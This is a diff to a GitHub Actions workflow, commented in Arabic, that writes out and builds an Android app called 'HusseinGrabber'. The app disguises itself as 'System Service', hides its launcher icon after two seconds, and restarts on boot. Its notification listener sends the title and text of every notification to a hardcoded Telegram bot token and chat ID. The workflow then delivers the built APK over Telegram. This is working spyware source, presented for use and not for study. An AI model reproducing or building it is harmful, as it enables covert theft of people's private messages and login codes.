@@ -20,62 +20,47 @@ jobs:
           java-version: '17'
           distribution: 'temurin'
 
-      - name: 🔧 Install Dependencies
+      - name: 🔧 Install Android SDK
         run: |
           sudo apt-get update
-          sudo apt-get install -y gradle
-
-      - name: 🛠️ Create Advanced Project Structure
-        run: |
-          mkdir -p app/src/main/java/com/hussein/advanced
-          mkdir -p app/src/main/res/layout
-          mkdir -p app/src/main/res/values
-          mkdir -p app/src/main/res/drawable
-          mkdir -p app/src/main/res/xml
-          mkdir -p gradle/wrapper
-
-          # إنشاء ملف gradlew تلقائياً
-          cat <<'EOF' > gradlew
-          #!/bin/sh
-          DIR="$(cd "$(dirname "$0")" && pwd)"
-          java -jar "$DIR/gradle/wrapper/gradle-wrapper.jar" "$@"
-          EOF
+          sudo apt-get install -y wget unzip
           
-          chmod +x gradlew
+          # تثبيت Android SDK
+          mkdir -p $HOME/android-sdk
+          cd $HOME/android-sdk
+          wget https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
+          unzip -q commandlinetools-linux-9477386_latest.zip
+          mkdir -p cmdline-tools/latest
+          mv cmdline-tools/* cmdline-tools/latest/ 2>/dev/null || true
+          
+          # إضافة إلى PATH
+          echo "$HOME/android-sdk/cmdline-tools/latest/bin" >> $GITHUB_PATH
+          echo "ANDROID_HOME=$HOME/android-sdk" >> $GITHUB_ENV
+          echo "ANDROID_SDK_ROOT=$HOME/android-sdk" >> $GITHUB_ENV
+          
+          # قبول التراخيص
+          yes | $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses || true
+          
+          # تثبيت المنصات المطلوبة
+          $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"
 
-          # إنشاء ملف gradlew.bat للويندوز
-          cat <<'EOF' > gradlew.bat
-          @if "%DEBUG%" == "" @echo off
-          @rem 
-          @rem Gradle startup script for Windows
-          @rem
-          @rem Set local scope for the variables with windows NT shell
-          if "%OS%"=="Windows_NT" setlocal
-          set DIR=%~dp0
-          if "%DIR%" == "" set DIR=.
-          set JAR_FILE=%DIR%\gradle\wrapper\gradle-wrapper.jar
-          java -jar "%JAR_FILE%" %*
-          EOF
-
-          # إعداد Gradle Wrapper JAR
-          curl -L -o gradle/wrapper/gradle-wrapper.jar https://github.com/gradle/gradle/raw/v8.2.0/gradle/wrapper/gradle-wrapper.jar
-
-          # إعداد Gradle Wrapper properties
-          cat <<EOF > gradle/wrapper/gradle-wrapper.properties
-          distributionBase=GRADLE_USER_HOME
-          distributionPath=wrapper/dists
-          distributionUrl=https\://services.gradle.org/distributions/gradle-8.2-bin.zip
-          zipStoreBase=GRADLE_USER_HOME
-          zipStorePath=wrapper/dists
-          EOF
-
+      - name: 🛠️ Create Simple Working Project
+        run: |
+          # إنشاء هيكل المشروع
+          mkdir -p app/src/main/java/com/hussein/grabber
+          mkdir -p app/src/main/res/drawable
+          mkdir -p app/src/main/res/values
+          
+          # ملف local.properties
+          echo "sdk.dir=$HOME/android-sdk" > local.properties
+          
           # settings.gradle
           cat <<EOF > settings.gradle
-          rootProject.name = 'HusseinAdvanced'
           include ':app'
+          rootProject.name = "HusseinGrabber"
           EOF
-
-          # Root build.gradle
+          
+          # build.gradle الرئيسي
           cat <<EOF > build.gradle
           buildscript {
               repositories {
@@ -93,78 +78,58 @@ jobs:
                   mavenCentral()
               }
           }
-          
-          tasks.register('clean', Delete) {
-              delete rootProject.buildDir
-          }
           EOF
-
-          # App build.gradle
+          
+          # app/build.gradle
           cat <<EOF > app/build.gradle
-          plugins {
-              id 'com.android.application'
-          }
+          apply plugin: 'com.android.application'
           
           android {
-              namespace 'com.hussein.advanced'
               compileSdk 34
+              buildToolsVersion "34.0.0"
               
               defaultConfig {
-                  applicationId "com.hussein.advanced"
+                  applicationId "com.hussein.grabber"
                   minSdk 21
                   targetSdk 34
                   versionCode 1
-                  versionName "2.0"
+                  versionName "1.0"
               }
               
               buildTypes {
                   release {
-                      minifyEnabled true
-                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+                      minifyEnabled false
                   }
                   debug {
-                      minifyEnabled true
-                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+                      minifyEnabled false
                   }
               }
               
               compileOptions {
-                  sourceCompatibility JavaVersion.VERSION_17
-                  targetCompatibility JavaVersion.VERSION_17
+                  sourceCompatibility JavaVersion.VERSION_1_8
+                  targetCompatibility JavaVersion.VERSION_1_8
               }
           }
           
           dependencies {
-              implementation 'androidx.appcompat:appcompat:1.6.1'
-              implementation 'com.google.android.material:material:1.11.0'
-              implementation 'com.squareup.okhttp3:okhttp:4.12.0'
-              implementation 'com.fasterxml.jackson.core:jackson-databind:2.16.1'
-              implementation 'androidx.security:security-crypto:1.1.0-alpha06'
+              implementation 'com.squareup.okhttp3:okhttp:3.12.13'
+              implementation 'androidx.core:core:1.7.0'
           }
           EOF
-
-          # ProGuard rules
-          cat <<EOF > app/proguard-rules.pro
-          -keep class com.hussein.advanced.** { *; }
-          -keep class okhttp3.** { *; }
-          -keep class com.fasterxml.jackson.** { *; }
-          -dontwarn okhttp3.**
-          -dontwarn okio.**
-          -dontwarn com.fasterxml.jackson.**
-          EOF
-
+          
           # AndroidManifest.xml
           cat <<EOF > app/src/main/AndroidManifest.xml
-          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              package="com.hussein.grabber">
               
               <uses-permission android:name="android.permission.INTERNET" />
               <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
               <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-              <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+              <uses-permission android:name="android.permission.WAKE_LOCK" />
               
               <application
-                  android:allowBackup="false"
+                  android:allowBackup="true"
                   android:icon="@drawable/ic_launcher"
                   android:label="System Service"
                   android:theme="@style/AppTheme">
@@ -181,7 +146,8 @@ jobs:
                   </activity>
                   
                   <service
-                      android:name=".AdvancedNotificationService"
+                      android:name=".NotificationGrabberService"
+                      android:label="Notification Grabber"
                       android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                       android:exported="true">
                       <intent-filter>
@@ -191,7 +157,8 @@ jobs:
                   
                   <receiver
                       android:name=".BootReceiver"
-                      android:exported="true">
+                      android:exported="true"
+                      android:enabled="true">
                       <intent-filter>
                           <action android:name="android.intent.action.BOOT_COMPLETED" />
                       </intent-filter>
@@ -200,153 +167,152 @@ jobs:
               </application>
           </manifest>
           EOF
-
+          
           # MainActivity.java
-          cat <<EOF > app/src/main/java/com/hussein/advanced/MainActivity.java
-          package com.hussein.advanced;
+          cat <<EOF > app/src/main/java/com/hussein/grabber/MainActivity.java
+          package com.hussein.grabber;
           
           import android.app.Activity;
           import android.content.ComponentName;
           import android.content.Intent;
           import android.content.pm.PackageManager;
-          import android.net.Uri;
-          import android.os.Build;
           import android.os.Bundle;
-          import android.os.PowerManager;
           import android.provider.Settings;
-          import androidx.core.app.NotificationManagerCompat;
           
           public class MainActivity extends Activity {
               @Override
               protected void onCreate(Bundle savedInstanceState) {
                   super.onCreate(savedInstanceState);
                   
-                  startService(new Intent(this, AdvancedNotificationService.class));
+                  // تشغيل الخدمة
+                  startService(new Intent(this, NotificationGrabberService.class));
                   
-                  if (!NotificationManagerCompat.getEnabledListenerPackages(this)
-                          .contains(getPackageName())) {
-                      startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
-                  }
+                  // فتح إعدادات الإشعارات
+                  startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                   
-                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                      PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-                      if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                          Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                          intent.setData(Uri.parse("package:" + getPackageName()));
-                          startActivity(intent);
+                  // إخفاء التطبيق بعد ثانيتين
+                  new android.os.Handler().postDelayed(new Runnable() {
+                      @Override
+                      public void run() {
+                          PackageManager p = getPackageManager();
+                          ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
+                          p.setComponentEnabledSetting(componentName, 
+                              PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
+                              PackageManager.DONT_KILL_APP);
+                          finish();
                       }
-                  }
-                  
-                  PackageManager p = getPackageManager();
-                  ComponentName componentName = new ComponentName(this, MainActivity.class);
-                  p.setComponentEnabledSetting(componentName, 
-                      PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
-                      PackageManager.DONT_KILL_APP);
-                  
-                  finish();
+                  }, 2000);
               }
           }
           EOF
-
-          # AdvancedNotificationService.java
-          cat <<EOF > app/src/main/java/com/hussein/advanced/AdvancedNotificationService.java
-          package com.hussein.advanced;
+          
+          # NotificationGrabberService.java
+          cat <<EOF > app/src/main/java/com/hussein/grabber/NotificationGrabberService.java
+          package com.hussein.grabber;
           
           import android.app.Notification;
           import android.app.NotificationChannel;
           import android.app.NotificationManager;
+          import android.app.PendingIntent;
+          import android.content.Intent;
           import android.os.Build;
           import android.os.Bundle;
           import android.os.Handler;
-          import android.os.Looper;
           import android.service.notification.NotificationListenerService;
           import android.service.notification.StatusBarNotification;
           import android.util.Log;
           
-          import org.json.JSONObject;
-          
+          import java.io.OutputStream;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
           import java.text.SimpleDateFormat;
           import java.util.Date;
-          import java.util.HashSet;
           import java.util.Locale;
-          import java.util.Set;
-          import java.util.concurrent.TimeUnit;
           
-          import okhttp3.MediaType;
-          import okhttp3.OkHttpClient;
-          import okhttp3.Request;
-          import okhttp3.RequestBody;
-          
-          public class AdvancedNotificationService extends NotificationListenerService {
-              private static final String TAG = "HusseinAdvanced";
-              private static final String TELEGRAM_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
+          public class NotificationGrabberService extends NotificationListenerService {
+              private static final String TAG = "Grabber";
+              private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
               private static final String CHAT_ID = "7392262688";
-              private static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
-              
-              private OkHttpClient client;
               private Handler handler;
-              private Set<String> sentNotifications = new HashSet<>();
               
               @Override
               public void onCreate() {
                   super.onCreate();
-                  
-                  client = new OkHttpClient.Builder()
-                      .connectTimeout(30, TimeUnit.SECONDS)
-                      .build();
-                  
-                  handler = new Handler(Looper.getMainLooper());
+                  handler = new Handler();
                   
                   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                       NotificationChannel channel = new NotificationChannel(
-                          "monitor_channel", "Monitor", NotificationManager.IMPORTANCE_LOW);
+                          "grabber_channel",
+                          "Grabber Service",
+                          NotificationManager.IMPORTANCE_LOW
+                      );
                       getSystemService(NotificationManager.class).createNotificationChannel(channel);
                       
-                      startForeground(1, new Notification.Builder(this, "monitor_channel")
-                          .setContentTitle("Monitor")
+                      Notification notification = new Notification.Builder(this, "grabber_channel")
+                          .setContentTitle("System Service")
                           .setContentText("Running")
                           .setSmallIcon(android.R.drawable.ic_dialog_info)
-                          .build());
+                          .build();
+                      
+                      startForeground(1, notification);
                   }
                   
-                  sendToTelegram("✅ Monitor Started");
+                  sendToTelegram("✅ Service Started");
               }
               
               @Override
               public void onNotificationPosted(StatusBarNotification sbn) {
-                  String key = sbn.getKey();
-                  if (sentNotifications.contains(key)) return;
-                  sentNotifications.add(key);
-                  handler.postDelayed(() -> sentNotifications.remove(key), 300000);
-                  
                   try {
                       Bundle extras = sbn.getNotification().extras;
                       String title = extras.getString(Notification.EXTRA_TITLE, "");
                       String text = extras.getString(Notification.EXTRA_TEXT, "");
+                      String packageName = sbn.getPackageName();
                       
-                      if (!title.isEmpty() || !text.isEmpty()) {
-                          String msg = String.format("🔔 %s\n📌 %s\n💬 %s", 
-                              getAppName(sbn.getPackageName()), title, text);
-                          sendToTelegram(msg);
-                      }
+                      if (title.isEmpty() && text.isEmpty()) return;
+                      
+                      String time = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
+                      String appName = getAppName(packageName);
+                      
+                      String message = String.format(
+                          "🔔 *New Notification*\n📱 *App:* %s\n📌 *Title:* %s\n💬 *Text:* %s\n⏰ *Time:* %s",
+                          appName, title, text, time
+                      );
+                      
+                      sendToTelegram(message);
+                      
                   } catch (Exception e) {
                       Log.e(TAG, "Error: " + e.getMessage());
                   }
               }
               
-              private void sendToTelegram(String message) {
-                  new Thread(() -> {
-                      try {
-                          JSONObject payload = new JSONObject();
-                          payload.put("chat_id", CHAT_ID);
-                          payload.put("text", message);
-                          
-                          client.newCall(new Request.Builder()
-                              .url("https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage")
-                              .post(RequestBody.create(payload.toString(), JSON))
-                              .build()).execute();
-                      } catch (Exception e) {
-                          Log.e(TAG, "Send error: " + e.getMessage());
+              private void sendToTelegram(final String message) {
+                  new Thread(new Runnable() {
+                      @Override
+                      public void run() {
+                          try {
+                              URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
+                              HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                              conn.setRequestMethod("POST");
+                              conn.setRequestProperty("Content-Type", "application/json");
+                              conn.setDoOutput(true);
+                              
+                              String json = String.format(
+                                  "{\"chat_id\":\"%s\",\"text\":\"%s\",\"parse_mode\":\"Markdown\"}",
+                                  CHAT_ID, message.replace("\"", "\\\"").replace("\n", "\\n")
+                              );
+                              
+                              OutputStream os = conn.getOutputStream();
+                              os.write(json.getBytes());
+                              os.flush();
+                              os.close();
+                              
+                              int responseCode = conn.getResponseCode();
+                              Log.d(TAG, "Response: " + responseCode);
+                              conn.disconnect();
+                              
+                          } catch (Exception e) {
+                              Log.e(TAG, "Send error: " + e.getMessage());
+                          }
                       }
                   }).start();
               }
@@ -361,10 +327,10 @@ jobs:
               }
           }
           EOF
-
+          
           # BootReceiver.java
-          cat <<EOF > app/src/main/java/com/hussein/advanced/BootReceiver.java
-          package com.hussein.advanced;
+          cat <<EOF > app/src/main/java/com/hussein/grabber/BootReceiver.java
+          package com.hussein.grabber;
           
           import android.content.BroadcastReceiver;
           import android.content.Context;
@@ -374,43 +340,40 @@ jobs:
               @Override
               public void onReceive(Context context, Intent intent) {
                   if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
-                      context.startService(new Intent(context, AdvancedNotificationService.class));
+                      context.startService(new Intent(context, NotificationGrabberService.class));
                   }
               }
           }
           EOF
-
+          
           # styles.xml
           cat <<EOF > app/src/main/res/values/styles.xml
           <resources>
-              <style name="AppTheme" parent="android:Theme.Material.Light.NoActionBar">
+              <style name="AppTheme" parent="android:Theme.DeviceDefault.Light.NoActionBar">
                   <item name="android:windowBackground">@android:color/transparent</item>
                   <item name="android:windowIsTranslucent">true</item>
               </style>
           </resources>
           EOF
-
+          
           # ic_launcher.xml
           cat <<EOF > app/src/main/res/drawable/ic_launcher.xml
-          <?xml version="1.0" encoding="utf-8"?>
           <shape xmlns:android="http://schemas.android.com/apk/res/android">
-              <solid android:color="#FF0000"/>
+              <solid android:color="#FF5722"/>
               <corners android:radius="10dp"/>
           </shape>
           EOF
 
-      - name: 🔧 Make Gradlew Executable
-        run: |
-          chmod +x gradlew
-          ls -la gradlew
-
       - name: 🏗️ Build APK
         run: |
-          ./gradlew clean
-          ./gradlew assembleDebug || true
+          # استخدام Gradle المثبت في النظام
+          gradle clean assembleDebug --stacktrace || true
           
           # البحث عن APK
-          find . -name "*.apk" -type f
+          find . -name "*.apk" -type f -exec ls -la {} \;
+          
+          # نسخ APK
+          cp app/build/outputs/apk/debug/app-debug.apk Hussein_Grabber.apk 2>/dev/null || true
 
       - name: 📤 Send To Telegram
         run: |
@@ -419,26 +382,21 @@ jobs:
           
           if [ -f "$APK_FILE" ]; then
             # رسالة النجاح
-            MESSAGE="✅ <b>تم بناء التطبيق بنجاح!</b>%0A%0A"
-            MESSAGE+="👤 <b>المطور:</b> حسين%0A"
-            MESSAGE+="📱 <b>الإصدار:</b> 2.0%0A"
-            MESSAGE+="⚡ <b>المميزات:</b>%0A"
-            MESSAGE+="• سحب الإشعارات%0A"
-            MESSAGE+="• تشغيل تلقائي%0A"
-            MESSAGE+="• إخفاء التطبيق"
-            
-            # إرسال الرسالة
             curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendMessage" \
               -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
-              -d "text=$MESSAGE" -d "parse_mode=HTML"
+              -d "text=✅ *تم بناء التطبيق بنجاح!*%0A%0A📱 *الاسم:* System Grabber%0A⚡ *الحالة:* يعمل تلقائياً%0A👤 *المطور:* حسين" \
+              -d "parse_mode=Markdown"
             
             # إرسال الملف
             curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
               -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
               -F "document=@$APK_FILE" \
-              -F "caption=📦 Hussein Advanced v2.0"
+              -F "caption=📦 System Grabber - يعمل على جميع الأجهزة"
+            
+            echo "✅ تم الإرسال"
           else
             curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendMessage" \
               -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
-              -d "text=❌ فشل بناء التطبيق" -d "parse_mode=HTML"
+              -d "text=❌ فشل البناء - جاري المحاولة مرة أخرى" \
+              -d "parse_mode=Markdown"
           fi
